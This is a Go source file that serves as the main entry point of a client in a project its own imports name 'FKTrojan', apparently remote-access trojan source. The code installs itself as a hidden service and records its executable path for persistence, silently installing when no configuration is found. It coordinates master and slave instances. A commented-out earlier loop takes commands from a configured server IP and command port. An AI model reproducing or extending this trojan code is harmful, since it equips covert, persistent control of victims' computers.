package main

import (
	"FKTrojan/client_singleton"
	"FKTrojan/flog"
	"FKTrojan/hide_client"
	"fmt"
	"os"
	"time"

	"github.com/qiniu/log"
)

/*
import (
	. "FKTrojan/command_handler_client"
	. "FKTrojan/config_client"
	"FKTrojan/service_command"
	"fmt"
	"io"
	"time"
)

func init() {
	Load()
	fmt.Printf("init complete, running ...\n")
}
func main() {
	// 并发控制
	countOfAcceptCommandSameTime := 3
	countControlChan := make(chan int, countOfAcceptCommandSameTime)
	for {
		countControlChan <- 1
		go func() {
			service_command.HandleCommand(Conf.ServerIp, Conf.CmdPort, func(r io.Reader, w io.Writer) error {
				return service_command.ClientHandler(r, w, ClientDo)
			})
			<-countControlChan
		}()
		time.Sleep(time.Second)
	}
}
*/
func init() {
	// 禁止客户端打印日志到文件
	Flog.Flog = log.New(os.Stdout, "", log.Ldefault)
}
func main() {
	if len(os.Args) > 1 {
		var err error
		switch os.Args[1] {
		case "debug":
			hide_client.Debug()
			break
		case "install":
			err = hide_client.Install()
			if err != nil {
				fmt.Printf("%s get error %v\n", os.Args[1], err)
			}
			fmt.Println("install service success...")
			time.Sleep(time.Second)
			err = hide_client.Start()
			if err != nil {
				fmt.Printf("%s get error %v\n", os.Args[1], err)
			}
			err = hide_client.WriteExePath()
			if err != nil {
				fmt.Println(err)
			}
			fmt.Println("start service success...")
			return
		case "uninstall":
			err = hide_client.Stop()
			if err != nil {
				fmt.Printf("%s get error %v\n", os.Args[1], err)
			}
			fmt.Println("stop service success...")
			time.Sleep(time.Second)
			err = hide_client.Uninstall()
			if err != nil {
				fmt.Printf("%s get error %v\n", os.Args[1], err)
			}
			fmt.Println("uninstall service success...")
			return
		case "start":
			err = hide_client.Start()
			if err != nil {
				fmt.Printf("%s get error %v\n", os.Args[1], err)
			}
			return
		case "stop":
			err = hide_client.Stop()
			if err != nil {
				fmt.Printf("%s get error %v\n", os.Args[1], err)
			}
			return
		case "service":
			err = hide_client.Service()
			if err != nil {
				fmt.Printf("%s get error %v\n", os.Args[1], err)
			}
			return
		case "config":
			err = hide_client.GetConfig()
			if err != nil {
				fmt.Printf("%s get error %v\n", os.Args[1], err)
			}
			return
		default:

		}

	}
	err := hide_client.GetConfig()
	if err != nil {
		err = hide_client.Install()
		if err != nil {
			fmt.Println(err)
			os.Exit(1)
		}
		err = hide_client.Start()
		if err != nil {
			fmt.Println(err)
			os.Exit(1)
		}
		err = hide_client.WriteExePath()
		if err != nil {
			fmt.Println(err)
		}
		fmt.Println("install and start success...")
		os.Exit(0)
	}
	mr, err := client_singleton.MasterIsRunning()
	if err != nil {
		Flog.Flog.Println(err)
		return
	}
	if !mr {
		func() {
			Flog.Flog.Println("master mode")
			u, err := client_singleton.MasterRegister()
			if err != nil {
				Flog.Flog.Println(err)
				return
			}
			defer client_singleton.Unregister(u)
			go client_singleton.MasterMainRun()
			hide_client.Master()
		}()
	} else {
		Flog.Flog.Println("slave mode")
		sr, err := client_singleton.SlaveIsRunning()
		if err != nil {
			Flog.Flog.Println(err)
			return
		}
		if !sr {
			u, err := client_singleton.SlaveRegister()
			if err != nil {
				Flog.Flog.Println(err)
				return
			}
			defer client_singleton.Unregister(u)
			client_singleton.SlaveMainRun()
		}
	}
}
